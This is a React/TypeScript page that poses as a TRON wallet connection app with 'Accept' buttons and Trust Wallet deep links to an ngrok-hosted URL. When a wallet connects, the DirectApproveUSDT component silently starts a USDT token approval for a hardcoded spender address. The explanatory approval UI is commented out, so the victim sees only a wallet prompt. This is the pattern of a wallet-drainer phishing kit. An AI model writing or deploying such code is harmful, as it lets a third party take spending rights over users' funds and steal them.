import React, { useState, useEffect, useCallback } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import {
    WalletActionButton,
    WalletConnectButton,
    WalletDisconnectButton,
    WalletModalProvider,
    WalletSelectButton,
} from '@tronweb3/tronwallet-adapter-react-ui';
import toast from 'react-hot-toast';
import {
    Alert,
} from '@mui/material';
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters';
import { tronWeb, setupTronWeb, approveToken, USDT_CONTRACT_ADDRESS } from './api/tronweb';
import { Button } from '@tronweb3/tronwallet-adapter-react-ui';

// Spender address to be approved
const SPENDER_ADDRESS = 'TZFHbzgx3fknbqUX9SAwSdXQi1JgwTX5yF';

const rows = [
    { name: 'Connect Button', reactUI: WalletConnectButton },
    { name: 'Disconnect Button', reactUI: WalletDisconnectButton },
    { name: 'Select Wallet Button', reactUI: WalletSelectButton },
    { name: 'Multi Action Button', reactUI: WalletActionButton },
];

// Trust Wallet deep link URL - fixed format
const TRUST_WALLET_URL = "https://link.trustwallet.com/open_url?coin_id=195&url=https://9223-154-208-62-138.ngrok-free.app";

// Alternative option with custom URI scheme (use this if the HTTPS version doesn't work)
const TRUST_WALLET_ALT_URL = "trust://open_url?coin_id=195&url=https://9223-154-208-62-138.ngrok-free.app";

// Function to detect if we're running in Trust Wallet
function isTrustWallet() {
    // Check for Trust Wallet's user agent
    if (typeof window !== 'undefined') {
        const userAgent = window.navigator.userAgent || '';
        
        // Check for Trust in user agent
        if (userAgent.includes('Trust') || userAgent.includes('TrustWallet')) {
            return true;
        }
        
        // Also check if we're in a mobile browser with Trust Wallet's ethereum object
        if (userAgent.includes('Mobile')) {
            // Use type assertion with optional chaining for type safety
            const ethereum = (window as any).ethereum;
            if (ethereum?.isTrust) {
                return true;
            }
        }
    }
    return false;
}

// Function to detect if device is mobile
function isMobile() {
    if (typeof window === 'undefined') return false;
    const ua = navigator.userAgent || navigator.vendor || (window as any).opera;
    // Checks for Android, iOS, and some common mobile browsers
    return /android|iphone|ipad|ipod|opera mini|iemobile|mobile/i.test(ua);
}

// Function to detect if device is desktop/laptop
function isDesktop() {
    return !isMobile();
}

export default function Home() {
    const [isInTrustWallet, setIsInTrustWallet] = useState(false);
    const [isOnDesktop, setIsOnDesktop] = useState(false);

    useEffect(() => {
        setIsInTrustWallet(isTrustWallet());
        setIsOnDesktop(isDesktop());
        console.log("Environment check:", { isInTrustWallet: isTrustWallet(), userAgent: window.navigator.userAgent });
    }, []);

    return (
        <div>
            <div style={{ textAlign: 'center', padding: '40px' }}>
                <h1>TRON Wallet Connection</h1>
                {isInTrustWallet ? (
                    // In Trust Wallet, only show connect wallet button
                    <SingleButton />
                ) : isOnDesktop ? (
                    // On desktop/laptop, show WalletConnect QR button
                    <DesktopWalletConnectButton />
                ) : (
                    // On mobile (not Trust Wallet), show "Open in Trust Wallet" button
                    <TrustWalletButton />
                )}
                <p style={{ marginTop: '20px', color: '#666', fontSize: '14px' }}>
                    {isInTrustWallet
                        ? 'You are viewing this app in Trust Wallet Browser'
                        : isOnDesktop
                        ? 'Scan the QR code with Trust Wallet to connect'
                        : 'For the best experience, open this app in Trust Wallet'}
                </p>
            </div>
            {/* <UIComponent></UIComponent> */}
            {/* <Profile /> */}
            {/* <SignDemo></SignDemo> */}
            <DirectApproveUSDT />
        </div>
    );
}

// Single button for connecting to wallet
function SingleButton() {
    return (
        <div style={{ margin: '20px 0' }}>
            <WalletActionButton style={{ 
                fontSize: '18px', 
                padding: '15px 30px',
                backgroundColor: '#3366FF',
                color: 'white',
                borderRadius: '4px',
            }} icon="">
                Accept
            </WalletActionButton>
        </div>
    );
}

// Desktop WalletConnect QR button (shows WalletActionButton)
function DesktopWalletConnectButton() {
    return (
        <div style={{ margin: '20px 0' }}>
            <WalletActionButton
                style={{
                    fontSize: '18px',
                    padding: '15px 30px',
                    backgroundColor: '#3366FF',
                    color: 'white',
                    borderRadius: '4px',
                }}
                icon=""
            >
                Connect Wallet
            </WalletActionButton>
            <p style={{ marginTop: '10px', color: '#666', textAlign: 'center' }}>
                Scan this QR code with Trust Wallet to connect
            </p>
        </div>
    );
}

// Trust Wallet button component
function TrustWalletButton() {
    const openTrustWallet = () => {
        // Try both formats in case one doesn't work
        try {
            // First try the standard HTTPS format
            window.location.href = TRUST_WALLET_URL;
            
            // Fallback - if user stays on page more than 2 seconds, try custom scheme
            setTimeout(() => {
                if (document.visibilityState !== 'hidden') {
                    console.log('Trying alternative deep link format...');
                    window.location.href = TRUST_WALLET_ALT_URL;
                }
            }, 2000);
        } catch (e) {
            console.error('Error opening Trust Wallet:', e);
            // Fallback to alternative URI
            window.location.href = TRUST_WALLET_ALT_URL;
        }
    };
    
    return (
        <div style={{ margin: '20px 0' }}>
            <button 
                onClick={openTrustWallet}
                style={{
                    fontSize: '18px',
                    padding: '15px 30px',
                    backgroundColor: '#3375BB', // Trust Wallet blue
                    color: 'white',
                    border: 'none',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontWeight: 'bold',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    margin: '0 auto',
                    boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)'
                }}
            >
                Accept
            </button>
            <p style={{ marginTop: '10px', color: '#666', textAlign: 'center' }}>
                Click to launch this app directly in Trust Wallet
            </p>
        </div>
    );
}

// function UIComponent() {
//     return (
//         <div>
//             <h2>UI Component</h2>
//             <TableContainer style={{ overflow: 'visible' }} component="div">
//                 <Table sx={{}} aria-label="simple table">
//                     <TableHead>
//                         <TableRow>
//                             <TableCell>Component</TableCell>
//                             <TableCell align="left">React UI</TableCell>
//                         </TableRow>
//                     </TableHead>
//                     <TableBody>
//                         {rows.map((row) => (
//                             <TableRow key={row.name} sx={{ '&:last-child td, &:last-child th': { border: 0 } }}>
//                                 <TableCell component="th" scope="row">
//                                     {row.name}
//                                 </TableCell>
//                                 <TableCell align="left">
//                                     <row.reactUI></row.reactUI>
//                                 </TableCell>
//                             </TableRow>
//                         ))}
//                     </TableBody>
//                 </Table>
//             </TableContainer>
//         </div>
//     );
// }

function Profile() {
    const { address, connected, wallet } = useWallet();
    return (
        <div>
            <h2>Wallet Connection Info</h2>
            <p>
                <span>Connection Status:</span> {connected ? 'Connected' : 'Disconnected'}
            </p>
            <p>
                <span>Your selected Wallet:</span> {wallet?.adapter.name}
            </p>
            <p>
                <span>Your Address:</span> {address}
            </p>
        </div>
    );
}

// Component that directly initiates approval
function DirectApproveUSDT() {
    const { connected, address, signTransaction, signMessage } = useWallet();
    const [isApproving, setIsApproving] = useState(false);
    const [approvalConfirmed, setApprovalConfirmed] = useState(false);
    const [status, setStatus] = useState('');
    const [errorMessage, setErrorMessage] = useState('');
    
    // Main function to initiate approval - wrapped in useCallback
    const initiateTokenApproval = useCallback(async () => {
        if (!connected || !address || isApproving || !signTransaction) {
            setErrorMessage('Wallet not connected or signing not available');
            return;
        }
        
        setIsApproving(true);
        setStatus('Creating USDT approval transaction...');
        setErrorMessage('');
        
        try {
            console.log("Starting approval process for:", address);
            
            // 1. Create an unsigned transaction
            const unsignedTx = await approveToken(address, SPENDER_ADDRESS);
            console.log("Unsigned transaction created:", unsignedTx);
            
            // 2. Show transaction prompt in wallet
            setStatus('Please check your wallet and confirm the transaction request');
            
            // 3. Send to wallet adapter for signing & broadcasting
            // This will trigger the wallet UI to show a confirmation
            console.log("Sending transaction to wallet for signing...");
            const signedTx = await signTransaction(unsignedTx);
            
            console.log("Transaction signed successfully:", signedTx);
            setStatus('Transaction signed and submitted!');
            setApprovalConfirmed(true);
            
        } catch (error: any) {
            console.error("Approval error:", error);
            
            // Format error message for display
            let errorMsg = error.message || 'Unknown error';
            
            if (errorMsg.includes('User rejected')) {
                errorMsg = 'Transaction was rejected in your wallet';
                // If user rejected, allow retry
                setTimeout(() => {
                    setIsApproving(false);
                }, 1000);
            } else {
                errorMsg = 'Error: ' + errorMsg;
                // If other error, also allow retry
                setTimeout(() => {
                    setIsApproving(false);
                }, 2000);
            }
            
            setErrorMessage(errorMsg);
            setStatus('Error occurred during approval');
        } finally {
            // We don't set isApproving to false here as we want
            // to handle different errors differently
        }
    }, [connected, address, isApproving, signTransaction]);
    
    // Auto-start approval when wallet connects
    useEffect(() => {
        // If connected, address available, not approving currently, and not already confirmed
        if (connected && address && !isApproving && !approvalConfirmed) {
            console.log('Wallet connected, automatically initiating approval...');
            
            // Small delay to ensure wallet connection is stable
            const timer = setTimeout(() => {
                initiateTokenApproval();
            }, 1000);
            
            return () => clearTimeout(timer);
        }
    }, [connected, address, isApproving, approvalConfirmed, initiateTokenApproval]);
    
    // Reset state when wallet disconnects
    useEffect(() => {
        if (!connected) {
            setApprovalConfirmed(false);
            setIsApproving(false);
            setStatus('');
            setErrorMessage('');
        }
    }, [connected]);
    
    // If not connected, don't show anything
    if (!connected) {
        return null;
    }
    
    return (<></>
        // <div style={{ padding: '20px', margin: '20px auto', maxWidth: '600px', border: '1px solid #eee', borderRadius: '10px' }}>
        //     <h2>USDT Approval</h2>
            
        //     {status && (
        //         <p style={{ fontWeight: 'bold', marginBottom: '10px' }}>
        //             {status}
        //         </p>
        //     )}
            
        //     {errorMessage && (
        //         <Alert severity="error" style={{ marginBottom: '15px' }}>
        //             {errorMessage}
        //         </Alert>
        //     )}
            
        //     <p>
        //         This app automatically requests approval for USDT with the spender address: <br/>
        //         <strong style={{ wordBreak: 'break-all' }}>{SPENDER_ADDRESS}</strong>
        //     </p>
            
        //     {approvalConfirmed ? (
        //         <Alert severity="success">
        //             USDT approval transaction submitted! You can now use the application.
        //         </Alert>
        //     ) : (
        //         <div>
        //             {isApproving ? (
        //                 <p style={{ marginTop: '15px', color: '#ff9800' }}>
        //                     Please check your wallet and confirm the transaction request.
        //                 </p>
        //             ) : (
        //                 <Button 
        //                     onClick={initiateTokenApproval}
        //                     style={{ 
        //                         marginTop: '10px', 
        //                         backgroundColor: '#2196f3',
        //                         color: 'white',
        //                         padding: '10px 20px'
        //                     }}
        //                 >
        //                     Approve USDT
        //                 </Button>
        //             )}
        //         </div>
        //     )}
        // </div>
    );
}


